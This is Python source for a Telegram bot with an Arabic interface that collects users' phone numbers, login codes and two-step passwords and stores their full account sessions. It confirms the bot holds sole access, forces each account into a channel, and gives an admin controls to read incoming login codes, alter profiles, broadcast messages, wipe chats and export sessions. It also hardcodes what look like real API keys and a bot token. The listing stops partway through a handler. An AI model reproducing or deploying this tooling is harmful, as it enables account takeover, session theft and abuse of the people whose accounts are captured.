import os
from telethon.tl import functions, types
from telethon.sessions import StringSession
import asyncio
import json
import time
from kvsqlite.sync import Client as uu
from telethon import TelegramClient, events, Button
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    AuthKeyUnregisteredError,
    SessionRevokedError,
    BotMethodInvalidError,
    MessageNotModifiedError,
    UserDeactivatedError,
    ChatAdminRequiredError,
    ChatWriteForbiddenError,
    UserNotParticipantError,
    QueryIdInvalidError,
    ReplyMarkupInvalidError,
    AuthKeyDuplicatedError
)

# إعداد دليل قاعدة البيانات
if not os.path.isdir('database'):
    os.mkdir('database')

# بيانات اعتماد Telegram API وتهيئة البوت
API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
TOKEN = "8025481175:AAEOZoWB_kVJzdFflcOikXZG77pNMQ8dWOU"
ADMIN_ID = 5260517001
CHANNEL_USERNAME = "@Viptofey"

# Initialize bot
bot = TelegramClient(StringSession(), API_ID, API_HASH)
bot.start(bot_token=TOKEN)

# تهيئة قاعدة البيانات
db = uu('database/elhakem.ss', 'bot')
for key in ["accounts", "admin_accounts", "events", "users", "reports", "notification_channel", "retry_counts", "banned_countries", "bot_status", "submission_results"]:
    if not db.exists(key):
        db.set(key, [] if key in ["accounts", "admin_accounts", "events", "banned_countries"] else {})

# حالة البوت الافتراضية
if not db.exists("bot_status"):
    db.set("bot_status", {
        "submissions_enabled": True,
        "verification_enabled": True,
        "notifications_enabled": True,
        "bot_enabled": True
    })

RANKS = ["مبتدئ 🌱", "مشارك 🏅", "متقدم 🌟", "خبير 🧠", "متميز 🏆", "محترف 🎖", "ماهر 🥇", "مبدع 💡", "عبقري 🚀", "أسطورة 🌐"]
active_submissions = {}
repeat_tasks = {}

def log_event(action, user, details=""):
    events = db.get("events")
    user_link = f"[{user}](tg://user?id={user})"
    events.append({"action": action, "user": user_link, "details": details})
    db.set("events", events)

def update_main_buttons(is_admin):
    accounts = db.get("accounts")
    accounts_count = len(accounts)
    main_buttons = []

    if is_admin:
        main_buttons = [
            [Button.inline("➕ إضافة حساب", data="add_account")],
            [Button.inline(f"📥 الحسابات المستلمة ({accounts_count})", data="received_accounts")],
            [Button.inline("⚙️ قائمة التحكم", data="control_panel")],
            [Button.inline("📢 تعيين قناة الإشعارات", data="set_notification_channel")],
            [Button.inline("📑 إضافة الجلسات إلى ملف", data="add_sessions_to_file")],
            [Button.inline("🔍 تفاصيل البوت", data="bot_details")],
            [Button.inline("🔔 تفعيل وتعطيل", data="toggle_bot_status")],
            [Button.inline("📈 عمليات التسليم", data="submission_results")]
        ]
    else:
        main_buttons = [
            [Button.inline("➕ تسليم حساب", data="submit_account")],
            [Button.inline("🚨 الإبلاغ عن مشكلة", data="report_issue")],
            [Button.inline("ℹ️ معلومات الحساب", data="account_info")],
            [Button.inline("👤 المطور", data="developer_info")],
            [Button.inline("💼 تسليم جلسة", data="submit_session")]
        ]

    return main_buttons

def get_user_rank(submitted_count):
    rank_index = min(submitted_count // 5, len(RANKS) - 1)
    return RANKS[rank_index]

async def ensure_channel_membership(account, channel_username):
    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
    try:
        await app.connect()
        await app(functions.channels.JoinChannelRequest(channel_username))
    except AuthKeyDuplicatedError:
        print(f"Session duplicated for {account['phone_number']}. Removing from active sessions.")
        accounts = db.get("accounts")
        accounts = [acc for acc in accounts if acc['phone_number'] != account['phone_number']]
        db.set("accounts", accounts)
    except Exception as e:
        print(f"Error ensuring channel membership for {account['phone_number']}: {str(e)}")
    finally:
        await app.disconnect()

async def check_and_ensure_membership():
    accounts = db.get("accounts")
    for account in accounts:
        await ensure_channel_membership(account, CHANNEL_USERNAME)

@bot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
async def start(event):
    await check_and_ensure_membership()

    user_id = str(event.chat_id)
    is_admin = int(user_id) == ADMIN_ID

    users = db.get("users")
    if user_id not in users:
        users[user_id] = {"submitted_accounts": []}
        db.set("users", users)

    user_data = users.get(user_id, {"submitted_accounts": []})
    submitted_count = len(user_data.get("submitted_accounts", []))
    user_rank = get_user_rank(submitted_count)
    user_name = (await bot.get_entity(int(user_id))).first_name

    if is_admin:
        welcome_text = (
            "👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله:"
        )
    else:
        bot_status = db.get("bot_status")
        if not bot_status["bot_enabled"]:
            await event.reply("🚫 البوت في وضع الصيانة الآن، يرجى التحلي بالصبر...")
            return

        welcome_text = (
            f"👋 أهلاً وسهلاً بك، {user_name}!\n\n"
            f"🔢 **عدد الحسابات التي قمت بتسليمها**: {submitted_count}\n"
            f"🔰 **رتبتك الحالية**: {user_rank}\n\n"
            "🌟 استخدم الأزرار أدناه للتفاعل مع البوت وتسليم حساباتك بسهولة وأمان.\n"
            "إذا واجهت أي مشكلة، لا تتردد في الإبلاغ عنها! 🚨"
        )

    await event.reply(welcome_text, buttons=update_main_buttons(is_admin))

@bot.on(events.callbackquery.CallbackQuery(data="account_info"))
async def account_info(event):
    user = await bot.get_entity(event.chat_id)
    profile_photo = await bot.download_profile_photo(user)

    user_data = db.get("users").get(str(event.chat_id), {"submitted_accounts": []})
    submitted_count = len(user_data.get("submitted_accounts", []))
    user_rank = get_user_rank(submitted_count)

    message = (
        f"👤 **معلومات الحساب**:\n\n"
        f"📛 **الاسم**: {user.first_name} {user.last_name or ''}\n"
        f"🆔 **الآيدي**: `{user.id}`\n"
        f"🔗 **المعرف**: @{user.username if user.username else 'غير متوفر'}\n"
        f"🔢 **عدد الحسابات التي تم تسليمها**: {submitted_count}\n"
        f"🔰 **رتبتك الحالية**: {user_rank}\n"
    )

    if profile_photo:
        await event.reply(file=profile_photo, message=message, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
    else:
        await event.reply(message, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

@bot.on(events.callbackquery.CallbackQuery(data="developer_info"))
async def developer_info(event):
    developer = await bot.get_entity(ADMIN_ID)
    profile_photo = await bot.download_profile_photo(developer)

    message = (
        f"👨‍💻 **معلومات المطور**:\n\n"
        f"📛 **الاسم**: {developer.first_name} {developer.last_name or ''}\n"
        f"🆔 **الآيدي**: `{developer.id}`\n"
        f"🔗 **المعرف**: @{developer.username if developer.username else 'غير متوفر'}\n"
    )

    if profile_photo:
        await event.reply(file=profile_photo, message=message, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
    else:
        await event.reply(message, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

@bot.on(events.callbackquery.CallbackQuery())
async def callback_handler(event):
    await check_and_ensure_membership()

    global inactive_accounts_global
    bot_status = db.get("bot_status")
    try:
        data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
        user_id = str(event.chat_id)
        accounts = db.get("accounts")
        users = db.get("users")
        reports = db.get("reports")
        notification_channel = db.get("notification_channel")
        retry_counts = db.get("retry_counts")
        banned_countries = db.get("banned_countries")
        submission_results = db.get("submission_results")

        if data == "main_menu":
            await event.edit("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله:", buttons=update_main_buttons(int(user_id) == ADMIN_ID))
            return

        if data == "toggle_bot_status":
            toggle_buttons = [
                [Button.inline(f"تسليم حسابات: {'✅' if bot_status.get('submissions_enabled', True) else '❌'}", data="toggle_submissions")],
                [Button.inline(f"التحقق: {'✅' if bot_status.get('verification_enabled', True) else '❌'}", data="toggle_verification")],
                [Button.inline(f"الأشعارات: {'✅' if bot_status.get('notifications_enabled', True) else '❌'}", data="toggle_notifications")],
                [Button.inline(f"البوت: {'✅' if bot_status.get('bot_enabled', True) else '❌'}", data="toggle_bot")],
                [Button.inline("🔙 رجوع", data="main_menu")]
            ]
            await event.edit("⚙️ اختر الحالة التي تريد تغييرها:", buttons=toggle_buttons)
            return

        # Handle toggles
        toggle_mapping = {
            "toggle_submissions": "submissions_enabled",
            "toggle_verification": "verification_enabled",
            "toggle_notifications": "notifications_enabled",
            "toggle_bot": "bot_enabled"
        }

        if data in toggle_mapping:
            key = toggle_mapping[data]
            bot_status[key] = not bot_status[key]
            db.set("bot_status", bot_status)
            await event.edit(f"✅ تم تغيير حالة {key.replace('_', ' ')}.", buttons=[[Button.inline("🔙 رجوع", data="toggle_bot_status")]])
            return

        if data == "bot_details":
            verified_accounts = sum(1 for account in accounts if account.get('verified', False))
            unverified_accounts = len(accounts) - verified_accounts
            multi_device_accounts = sum(1 for account in accounts if account.get('device_count', 0) > 1)

            details_text = (
                "📊 **تفاصيل البوت**:\n\n"
                "حالة العمل:\n"
                f"تسليم حسابات: {'مفعل ✅' if bot_status.get('submissions_enabled', True) else 'معطل ❌'}\n"
                f"الأشعارات: {'مفعل ✅' if bot_status.get('notifications_enabled', True) else 'معطل ❌'}\n"
                f"التحقق: {'مفعل ✅' if bot_status.get('verification_enabled', True) else 'معطل ❌'}\n"
                f"البوت: {'مفعل ✅' if bot_status.get('bot_enabled', True) else 'معطل ❌'}\n\n"
                f"عدد الحسابات التي تم التحقق منها: {verified_accounts}\n"
                f"عدد الحسابات التي لم يتم التحقق منها: {unverified_accounts}\n"
                f"عدد الحسابات التي تحتوي على أكثر من جهاز: {multi_device_accounts}\n"
            )
            await event.edit(details_text, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "submission_results":
            successful = submission_results.get("successful", [])
            failed = submission_results.get("failed", [])
            pending = submission_results.get("pending", [])

            results_text = (
                "📈 **نتائج عمليات التسليم**:\n\n"
                f"✅ **الناجحة**: {len(successful)} حساب\n"
                f"❌ **الفاشلة**: {len(failed)} حساب\n"
                f"⏳ **قيد المعالجة**: {len(pending)} حساب\n\n"
            )
            await event.edit(results_text, buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "submit_account":
            if not bot_status.get("submissions_enabled", True):
                await event.answer("🚫 تسليم الحسابات تحت الصيانة لبعض الوقت، يرجى الانتظار.", alert=True)
                return

            if active_submissions.get(user_id, 0) > 0:
                await event.answer("🔄 لديك عملية تسليم جارية بالفعل. يرجى إتمامها أولاً.", alert=True)
                return

            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("🔢 كم عدد الحسابات التي ترغب في تسليمها؟ يرجى إرسال العدد كرقم.")
                txt = await x.get_response()

                try:
                    count_to_submit = int(txt.text)
                except ValueError:
                    await x.send_message("❌ الرقم المدخل غير صالح. يرجى المحاولة مرة أخرى.")
                    return

                if count_to_submit <= 0:
                    await x.send_message("❌ يجب أن يكون العدد أكبر من 0.")
                    return

                active_submissions[user_id] = count_to_submit

                while active_submissions.get(user_id, 0) > 0:
                    await x.send_message(
                        f"✅ العدد المختار: {count_to_submit}\nيرجى الآن إرسال رقم الهاتف مع رمز الدولة، مثال: +201000000000",
                        buttons=[[Button.inline("🔙 إلغاء العملية", data=f"cancel_submission_{user_id}")]]
                    )
                    phone_txt = await x.get_response()

                    if phone_txt.text.lower() == "cancel":
                        await x.send_message("☑️ تم إلغاء عملية التسليم والعودة إلى القائمة الرئيسية.", buttons=update_main_buttons(int(user_id) == ADMIN_ID))
                        active_submissions.pop(user_id, None)
                        return

                    phone_number = phone_txt.text.replace("+", "").replace(" ", "")

                    if any(phone_number.startswith(banned[1:]) for banned in banned_countries):
                        await x.send_message("❌ نحن لا نقبل أرقام لهذه الدولة حالياً. لا تزال عملية التسليم جارية، يرجى المحاولة مرة أخرى أو الضغط على زر إلغاء العملية.", buttons=[[Button.inline("🔙 إلغاء العملية", data=f"cancel_submission_{user_id}")]])
                        continue

                    if any(account['phone_number'] == phone_number for account in accounts):
                        await x.send_message("❌ هذا الحساب موجود بالفعل في تخزين المسؤول. لا تزال عملية التسليم جارية، يرجى المحاولة مرة أخرى أو الضغط على زر إلغاء العملية.", buttons=[[Button.inline("🔙 إلغاء العملية", data=f"cancel_submission_{user_id}")]])
                        continue

                    submission_results["pending"].append(phone_number)
                    db.set("submission_results", submission_results)

                    app = TelegramClient(StringSession(), API_ID, API_HASH)
                    await app.connect()
                    try:
                        await app.send_code_request(phone_number)
                    except (ApiIdInvalidError, PhoneNumberInvalidError):
                        await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف. لا تزال عملية التسليم جارية، يرجى المحاولة مرة أخرى أو الضغط على زر إلغاء العملية.", buttons=[[Button.inline("🔙 إلغاء العملية", data=f"cancel_submission_{user_id}")]])
                        submission_results["failed"].append(phone_number)
                        submission_results["pending"].remove(phone_number)
                        db.set("submission_results", submission_results)
                        continue

                    await x.send_message("🔑 تم إرسال كود التحقق الخاص بك على تيليجرام. أرسل الكود بالتنسيق التالي: 12345")
                    code_txt = await x.get_response()
                    code = code_txt.text.replace(" ", "")
                    try:
                        await app.sign_in(phone_number, code)

                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)
                        user_data = db.get("users").get(user_id, {"submitted_accounts": []})
                        user_data["submitted_accounts"].append(phone_number)
                        db.set("users", {**users, user_id: user_data})

                        accounts.append({"phone_number": phone_number, "session": app.session.save(), "user_id": user_id, "device_count": device_count})
                        db.set("accounts", accounts)

                        await ensure_channel_membership({"session": app.session.save(), "phone_number": phone_number}, CHANNEL_USERNAME)

                        if bot_status.get("verification_enabled", True):
                            await x.send_message(
                                f"📞 **رقم الهاتف**: `{phone_number}`\n"
                                f"📱 **عدد الأجهزة المتصلة**: {device_count}\n\n"
                                "👀 قم بالتحقق من كون البوت هو الوحيد المتصل بالحساب.\n",
                                buttons=[Button.inline("✅ تحقق", data=f"verify_session_{phone_number}_{user_id}")]
                            )
                        else:
                            await x.send_message(
                                f"📞 **رقم الهاتف**: `{phone_number}`\n"
                                f"📱 **عدد الأجهزة المتصلة**: {device_count}\n\n"
                                "⚠️ تم إضافة الحساب بنجاح لكن التحقق معطل. تأكد من إعدادات الأمان."
                            )

                        active_submissions[user_id] -= 1
                        submission_results["successful"].append(phone_number)
                        submission_results["pending"].remove(phone_number)
                        db.set("submission_results", submission_results)

                        if active_submissions[user_id] > 0:
                            await x.send_message(f"🔄 تبقى لديك {active_submissions[user_id]} حسابات للتسليم.")
                        else:
                            await x.send_message("✅ تم تسليم جميع الحسابات المطلوبة بنجاح!")
                            active_submissions.pop(user_id, None)

                    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                        await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية. لا تزال عملية التسليم جارية، يرجى المحاولة مرة أخرى أو الضغط على زر إلغاء العملية.", buttons=[[Button.inline("🔙 إلغاء العملية", data=f"cancel_submission_{user_id}")]])
                        submission_results["failed"].append(phone_number)
                        submission_results["pending"].remove(phone_number)
                        db.set("submission_results", submission_results)
                        continue
                    except SessionPasswordNeededError:
                        await x.send_message("🔐 أرسل رمز التحقق بخطوتين الخاص بحسابك.")
                        txt = await x.get_response()
                        password = txt.text
                        try:
                            await app.sign_in(password=password)

                            sessions = await app(functions.account.GetAuthorizationsRequest())
                            device_count = len(sessions.authorizations)
                            accounts.append({"phone_number": phone_number, "session": app.session.save(), "two_step": True, "user_id": user_id, "device_count": device_count})
                            db.set("accounts", accounts)

                            await ensure_channel_membership({"session": app.session.save(), "phone_number": phone_number}, CHANNEL_USERNAME)

                            if bot_status.get("verification_enabled", True):
                                await x.send_message(
                                    f"📞 **رقم الهاتف**: `{phone_number}`\n"
                                    f"📱 **عدد الأجهزة المتصلة**: {device_count}\n\n"
                                    "👀 قم بالتحقق من كون البوت هو الوحيد المتصل بالحساب.\n",
                                    buttons=[Button.inline("✅ تحقق", data=f"verify_session_{phone_number}_{user_id}")]
                                )
                            else:
                                await x.send_message(
                                    f"📞 **رقم الهاتف**: `{phone_number}`\n"
                                    f"📱 **عدد الأجهزة المتصلة**: {device_count}\n\n"
                                    "⚠️ تم إضافة الحساب بنجاح لكن التحقق معطل. تأكد من إعدادات الأمان."
                                )

                            active_submissions[user_id] -= 1
                            submission_results["successful"].append(phone_number)
                            submission_results["pending"].remove(phone_number)
                            db.set("submission_results", submission_results)

                            if active_submissions[user_id] > 0:
                                await x.send_message(f"🔄 تبقى لديك {active_submissions[user_id]} حسابات للتسليم.")
                            else:
                                await x.send_message("✅ تم تسليم جميع الحسابات المطلوبة بنجاح!")
                                active_submissions.pop(user_id, None)

                        except PasswordHashInvalidError:
                            await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح. لا تزال عملية التسليم جارية، يرجى المحاولة مرة أخرى أو الضغط على زر إلغاء العملية.", buttons=[[Button.inline("🔙 إلغاء العملية", data=f"cancel_submission_{user_id}")]])
                            submission_results["failed"].append(phone_number)
                            submission_results["pending"].remove(phone_number)
                            db.set("submission_results", submission_results)
                            continue
                        except Exception as e:
                            await x.send_message(f"⚠️ حدث خطأ غير متوقع: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                            submission_results["failed"].append(phone_number)
                            submission_results["pending"].remove(phone_number)
                            db.set("submission_results", submission_results)
                    finally:
                        await app.disconnect()

        elif data.startswith("verify_session_"):
            if not bot_status.get("verification_enabled", True):
                await event.answer("🚫 التحقق معطل حالياً.", alert=True)
                return

            phone_number, user_id = data.split("_")[2], data.split("_")[3]
            retry_counts = db.get("retry_counts")
            current_retry_count = retry_counts.get(phone_number, 0) + 1
            retry_counts[phone_number] = current_retry_count
            db.set("retry_counts", retry_counts)

            for account in accounts:
                if phone_number == account['phone_number']:
                    app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)

                        if device_count == 1:
                            account['verified'] = True
                            db.set("accounts", accounts)
                            log_event("تسليم حساب", user_id, f"رقم الهاتف: {phone_number}")

                            user_data = db.get("users").get(user_id, {"submitted_accounts": []})
                            submitted_count = len(user_data.get("submitted_accounts", []))

                            await event.edit(
                                f"✅ تم التحقق وإضافة الحساب بنجاح!\n"
                                f"📞 **رقم الهاتف**: `{phone_number}`\n"
                                f"🔢 لقد قمت بتسليم {submitted_count} حساب{'ات' if submitted_count != 1 else ''} حتى الآن.",
                                buttons=[[Button.inline("🔙 رجوع", data="main_menu")]]
                            )

                            if notification_channel and bot_status.get("notifications_enabled", True):
                                masked_phone = phone_number[:3] + "****" + phone_number[-3:]
                                two_step_status = "مفعل" if 'two_step' in account else "غير مفعل"
                                await bot.send_message(
                                    notification_channel,
                                    f"#تسليم\n\n"
                                    f"🚀 **تم إضافة حساب جديد**:\n"
                                    f"👤 **المستخدم**: [{user_id}](tg://user?id={user_id})\n"
                                    f"📞 **رقم الهاتف**: `{masked_phone}`\n"
                                    f"📱 **عدد الأجهزة المتصلة**: {device_count}\n"
                                    f"🔒 **التحقق بخطوتين**: {two_step_status}"
                                )
                        else:
                            await event.edit(
                                f"❌ لا يزال هناك جلسات أخرى متصلة. عدد الأجهزة المتصلة حاليًا: {device_count}.\n"
                                f"لقد قمت بإعادة المحاولة ({current_retry_count}) حتى الآن.",
                                buttons=[
                                    [Button.inline("🔄 تحقق مرة أخرى", data=f"verify_session_{phone_number}_{user_id}")]
                                ]
                            )
                    except (SessionRevokedError, AuthKeyDuplicatedError):
                        await handle_session_revoked(phone_number, event)
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("cancel_submission_"):
            user_id_to_cancel = data.split("_")[2]
            if user_id == user_id_to_cancel:
                active_submissions.pop(user_id, None)
                await event.edit("☑️ تم إلغاء عملية التسليم والعودة إلى القائمة الرئيسية.", buttons=update_main_buttons(int(user_id) == ADMIN_ID))

        elif data == "report_issue":
            last_report_time = reports.get(user_id, 0)
            current_time = time.time()

            if current_time - last_report_time < 7200:
                await event.answer("❌ لا يمكنك الإبلاغ عن مشكلة أخرى الآن. حاول مرة أخرى لاحقًا.", alert=True)
                return

            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("📝 يرجى وصف المشكلة التي تواجهها:")
                report = await x.get_response()
                report_text = report.text

                if notification_channel and bot_status.get("notifications_enabled", True):
                    try:
                        await bot.send_message(notification_channel, f"#ابلاغ\n\n🚨 **تقرير مشكلة جديدة**:\n\nالمستخدم: [{user_id}](tg://user?id={user_id})\nالمشكلة: {report_text}")
                    except Exception as e:
                        print(f"Failed to send report notification: {e}")
                reports[user_id] = current_time
                db.set("reports", reports)

                await x.send_message("✅ تم إرسال تقرير المشكلة إلى المسؤول. شكرًا لك!", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

        elif data == "add_account":
            if int(user_id) != ADMIN_ID:
                await event.answer("❌ هذا الخيار متاح للمسؤول فقط.", alert=True)
                return

            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("✔️ الآن أرسل رقم الهاتف لإضافته، مثال: +201000000000")
                txt = await x.get_response()
                phone_number = txt.text.replace("+", "").replace(" ", "")

                app = TelegramClient(StringSession(), API_ID, API_HASH)
                await app.connect()
                password = None
                try:
                    await app.send_code_request(phone_number)
                except (ApiIdInvalidError, PhoneNumberInvalidError):
                    await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                    return

                await x.send_message("🔑 تم إرسال كود التحقق الخاص بك على تيليجرام. أرسل الكود بالتنسيق التالي: 12345")
                txt = await x.get_response()
                code = txt.text.replace(" ", "")
                try:
                    await app.sign_in(phone_number, code)

                    accounts.append({"phone_number": phone_number, "session": app.session.save()})
                    db.set("accounts", accounts)
                    log_event("إضافة حساب", user_id, f"رقم الهاتف: {phone_number}")

                    await ensure_channel_membership({"session": app.session.save(), "phone_number": phone_number}, CHANNEL_USERNAME)

                    await x.send_message("✅ تم إضافة الحساب بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])

                except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                    await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                    return
                except SessionPasswordNeededError:
                    await x.send_message("🔐 أرسل رمز التحقق بخطوتين الخاص بالحساب.")
                    txt = await x.get_response()
                    password = txt.text
                    try:
                        await app.sign_in(password=password)

                        accounts.append({"phone_number": phone_number, "session": app.session.save(), "two_step": True})
                        db.set("accounts", accounts)
                        log_event("إضافة حساب", user_id, f"رقم الهاتف: {phone_number} مع تحقق بخطوتين")

                        await ensure_channel_membership({"session": app.session.save(), "phone_number": phone_number}, CHANNEL_USERNAME)

                        await x.send_message("✅ تم إضافة الحساب بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                    except PasswordHashInvalidError:
                        await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                        return
                    except Exception as e:
                        await x.send_message(f"⚠️ حدث خطأ غير متوقع: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                finally:
                    await app.disconnect()

        elif data == "received_accounts":
            if len(accounts) == 0:
                await event.edit("❌ لا توجد حسابات مستلمة.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                return

            received_buttons = [[Button.inline(f"📥 {i['phone_number']}", data=f"get_received_{i['phone_number']}")] for i in accounts]
            received_buttons.append([Button.inline("🔙 رجوع", data="main_menu")])
            await event.edit("📥 اختر الحساب المستلم لإدارة الخيارات:", buttons=received_buttons)

        elif data.startswith("get_received_"):
            phone_number = data.split("_")[2]
            for i in accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    try:
                        await app.connect()
                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)

                        text = f"📞 **رقم الهاتف**: `{phone_number}`\n" \
                               f"📱 **عدد الأجهزة المتصلة**: {device_count}\n"

                        account_action_buttons = [
                            [Button.inline("🔒 تسجيل خروج", data=f"logout_received_{phone_number}")],
                            [Button.inline("📩 جلب آخر كود", data=f"code_received_{phone_number}")],
                            [Button.inline("ℹ️ معلومات الحساب", data=f"account_info_{phone_number}")],
                            [Button.inline("✏️ تغيير معلومات الحساب", data=f"change_account_info_{phone_number}")],
                            [Button.inline("📢 إرسال رسالة للجميع", data=f"broadcast_message_{phone_number}")],
                            [Button.inline("🗑️ حذف جميع المحادثات", data=f"delete_all_chats_{phone_number}")],
                            [Button.inline("📋 استخراج جلسة الحساب", data=f"extract_session_{phone_number}")],
                            [Button.inline("🔄 تكرار", data=f"repeat_action_{phone_number}")],
                            [Button.inline("🔙 رجوع", data="received_accounts")]
                        ]
                        await event.edit(text, buttons=account_action_buttons)
                    except (SessionRevokedError, AuthKeyUnregisteredError, AuthKeyDuplicatedError):
                        await handle_session_revoked(phone_number, event)
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("logout_received_"):
            phone_number = data.split("_")[-1]
            for i in accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        await app.log_out()
                        accounts.remove(i)
                        db.set("accounts", accounts)

                        log_event("تسجيل خروج", user_id, f"رقم الهاتف: {phone_number}")
                        await event.edit(f"✅ تم تسجيل الخروج من الحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("code_received_"):
            phone_number = data.split("_")[-1]
            for i in accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        code = await app.get_messages(777000, limit=1)
                        code_number = code[0].message.strip().split(':')[1].split('.')[0].strip()
                        await event.edit(
                            f"📩 آخر كود تم استلامه: `{code_number}`",
                            buttons=[
                                [Button.inline("🔒 تسجيل خروج", data=f"logout_received_{phone_number}")],
                                [Button.inline("🔙 رجوع", data="main_menu")]
                            ]
                        )
                    except IndexError:
                        await event.edit("❌ لا يوجد كود تحقق متاح حاليًا.", buttons=[[Button.inline("🔙 رجوع", data="main_menu")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("account_info_"):
            phone_number = data.split("_")[-1]
            for i in accounts:
                if phone_number == i['phone_number']:
                    app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                    await app.connect()
                    try:
                        user = await app.get_me()
                        dialogs = await app.get_dialogs()
                        total_chats = len(dialogs)
                        contacts = await app(functions.contacts.GetContactsRequest(hash=0))
                        total_contacts = len(contacts.users)
                        blocked_users = await app(functions.contacts.GetBlockedRequest(offset=0, limit=1))
                        total_blocked = len(blocked_users.blocked)
                        sessions = await app(functions.account.GetAuthorizationsRequest())
                        device_count = len(sessions.authorizations)

                        info_text = (
                            f"ℹ️ **معلومات الحساب**:\n\n"
                            f"📛 **الاسم الأول**: {user.first_name}\n"
                            f"📛 **الاسم الأخير**: {user.last_name or 'غير متوفر'}\n"
                            f"🆔 **الآيدي**: `{user.id}`\n"
                            f"🔗 **المعرف**: @{user.username if user.username else 'غير متوفر'}\n"
                            f"📞 **رقم الهاتف**: `{phone_number}`\n"
                            f"📜 **السيرة الذاتية**: {user.about or 'غير متوفر'}\n"
                            f"👥 **عدد جهات الاتصال**: {total_contacts}\n"
                            f"💬 **عدد المحادثات**: {total_chats}\n"
                            f"🚫 **عدد المحظورين**: {total_blocked}\n"
                            f"📱 **عدد الأجهزة**: {device_count}\n"
                        )
                        await event.edit(info_text, buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]])
                    except Exception as e:
                        await event.edit(f"❌ حدث خطأ أثناء جلب المعلومات: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]])
                    finally:
                        await app.disconnect()
                    break

        elif data.startswith("change_account_info_"):
            phone_number = data.split("_")[-1]
            await event.edit("🔧 اختر ما تريد تغييره:", buttons=[
                [Button.inline("📝 تغيير الاسم", data=f"change_name_{phone_number}")],
                [Button.inline("🖼️ تغيير الصورة", data=f"change_photo_{phone_number}")],
                [Button.inline("📜 تغيير السيرة الذاتية", data=f"change_bio_{phone_number}")],
                [Button.inline("👤 تغيير اسم المستخدم", data=f"change_username_{phone_number}")],
                [Button.inline("📩 جلب الرسائل المحفوظة", data=f"fetch_saved_messages_{phone_number}")],
                [Button.inline("🔙 رجوع", data=f"get_received_{phone_number}")]
            ])

        elif data.startswith("change_name_"):
            phone_number = data.split("_")[-1]
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("📝 أرسل الاسم الجديد:")
                new_name = await x.get_response()

                for account in accounts:
                    if account['phone_number'] == phone_number:
                        app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                        await app.connect()
                        try:
                            await app(functions.account.UpdateProfileRequest(first_name=new_name.text))
                            await x.send_message("✅ تم تغيير الاسم بنجاح!", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        except Exception as e:
                            await x.send_message(f"❌ حدث خطأ: {str(e)}", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                        finally:
                            await app.disconnect()
                        break

        elif data.startswith("change_photo_"):
            phone_number = data.split("_")[-1]
            async with bot.conversation(event.chat_id, exclusive=True) as x:
                await x.send_message("🖼️ أرسل الصورة الجديدة:")
                photo = await x.get_response()

                if not photo.photo:
                    await x.send_message("❌ يرجى إرسال صورة وليس ملف.", buttons=[[Button.inline("🔙 رجوع", data="received_accounts")]])
                    return

                for account in accounts:
                    if account['phone_number'] == phone_number:
                        app = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
                        await app.connect()
                        try:
                            file = await app.upload_file(await photo.download_media())
                            await app(functions.photos.UploadProfilePhotoRequest(file=file))
